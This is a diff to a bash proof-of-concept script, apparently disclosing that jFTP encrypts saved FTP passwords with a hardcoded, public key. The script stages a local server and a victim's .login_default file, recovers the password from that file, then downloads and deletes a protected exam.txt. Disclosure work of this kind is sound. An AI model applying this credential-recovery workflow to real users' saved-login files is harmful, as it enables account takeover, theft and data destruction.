@@ -31,9 +31,20 @@ if [[ ! -f "${PYFTPDLIB_SRC}/pyftpdlib/__init__.py" ]]; then
     exit 1
 fi
 
-CRYPTO_CP="${DEMO_DIR}/crypto_helper/out:${JFTP_SRC}/lib"
+# The Java launcher wants ';' between classpath entries on Windows (even
+# under Git Bash/MSYS, since it's the native java.exe doing the parsing)
+# and ':' everywhere else.
+case "$(uname -s)" in
+    CYGWIN*|MINGW*|MSYS*) CP_SEP=';' ;;
+    *) CP_SEP=':' ;;
+esac
+CRYPTO_CP="${DEMO_DIR}/crypto_helper/out${CP_SEP}${JFTP_SRC}/lib"
 
-SERVER_ROOT="${DEMO_DIR}/server_root"
+# The FTP server's document root is the pyftpdlib/ checkout itself (not a
+# separate scratch directory), so this demo exercises the real project
+# layout: exam.txt is dropped directly into pyftpdlib/ and served/deleted
+# from there.
+SERVER_ROOT="${PYFTPDLIB_SRC}"
 BOOKMARK_FILE="${DEMO_DIR}/jftp_config/.login_default"
 ATTACKER_DIR="${DEMO_DIR}/attacker_workspace"
 LOG_FILE="${DEMO_DIR}/logs/server.log"
@@ -61,15 +72,17 @@ cleanup() {
 trap cleanup EXIT
 
 section "0. Reset demo state"
-mkdir -p "${SERVER_ROOT}" "$(dirname "${BOOKMARK_FILE}")" "${ATTACKER_DIR}" "$(dirname "${LOG_FILE}")"
+mkdir -p "$(dirname "${BOOKMARK_FILE}")" "${ATTACKER_DIR}" "$(dirname "${LOG_FILE}")"
 # restore exam.txt from the fixture if a previous run deleted it (the
-# exploit step below deletes it from server_root by design)
+# exploit step below deletes it from server_root by design). server_root
+# IS the pyftpdlib/ checkout, so we only ever touch exam.txt inside it,
+# never the directory itself.
 if [[ ! -f "${SERVER_ROOT}/exam.txt" ]]; then
     cp "${DEMO_DIR}/fixtures/exam.txt" "${SERVER_ROOT}/exam.txt"
 fi
 rm -f "${ATTACKER_DIR}"/exam.txt
-echo "server_root contents:"
-ls -la "${SERVER_ROOT}"
+echo "server_root (${SERVER_ROOT}) exam.txt:"
+ls -la "${SERVER_ROOT}/exam.txt"
 
 section "1. Start the FTP server (one account, no anonymous access)"
 python3 "${DEMO_DIR}/server.py" \
@@ -96,7 +109,7 @@ echo "server started, pid=${SERVER_PID}"
 section "2. Baseline: confirm the exam is NOT reachable without credentials"
 python3 "${DEMO_DIR}/ftp_probe.py" baseline --host "$HOST" --port "$PORT"
 
-section "3. Victim side: TA saves the FTP login in jFTP (bookmark file written to disk)"
+section "3. Victim side: TA saves the FTP login in jFTP (.login_default written to disk)"
 ENCRYPTED_PW=$(java -cp "${CRYPTO_CP}" CryptoCli encrypt "${VICTIM_PASSWORD}")
 cat > "${BOOKMARK_FILE}" <<EOF
 ${HOST}
@@ -112,8 +125,8 @@ echo "(this is the kind of file that ends up in backups, shared lab accounts,"
 echo " synced dotfiles, etc. -- the attacker's starting point is just read"
 echo " access to this file, NOT the real FTP password.)"
 
-section "4. Attacker side: recover the password from the bookmark file"
-echo "attacker reads the bookmark file off disk:"
+section "4. Attacker side: recover the password from .login_default"
+echo "attacker reads .login_default off disk:"
 BM_HOST=$(sed -n '1p' "${BOOKMARK_FILE}")
 BM_USER=$(sed -n '2p' "${BOOKMARK_FILE}")
 BM_ENC_PW=$(sed -n '3p' "${BOOKMARK_FILE}")
@@ -144,8 +157,12 @@ python3 "${DEMO_DIR}/ftp_probe.py" exploit \
     --local-dir "${ATTACKER_DIR}"
 
 section "6. Impact"
-echo "server_root now contains:"
-ls -la "${SERVER_ROOT}"
+if [[ -f "${SERVER_ROOT}/exam.txt" ]]; then
+    echo "server_root (${SERVER_ROOT}) still has exam.txt:"
+    ls -la "${SERVER_ROOT}/exam.txt"
+else
+    echo "server_root (${SERVER_ROOT}) exam.txt: GONE"
+fi
 echo
 echo "attacker_workspace now contains:"
 ls -la "${ATTACKER_DIR}"
@@ -169,7 +186,8 @@ Root cause: net.sf.jftp.config.Crypto uses a hardcoded password and salt
 (PBEWithMD5AndDES) to obscure saved FTP passwords. This is reversible
 encryption with a key that is identical for every user and every install,
 and is public (it ships in the open-source jar/class files). Anyone who can
-read a user's saved-login file (bookmarks.txt / .login_default) can recover
+read a user's saved-login file (.login_default, written when "remember
+this login" is checked in jFTP's connect dialog) can recover
 the real FTP password without brute-forcing, sniffing traffic, or touching
 the server at all -- "storing" the password this way is only cosmetically
 different from storing it in plaintext.
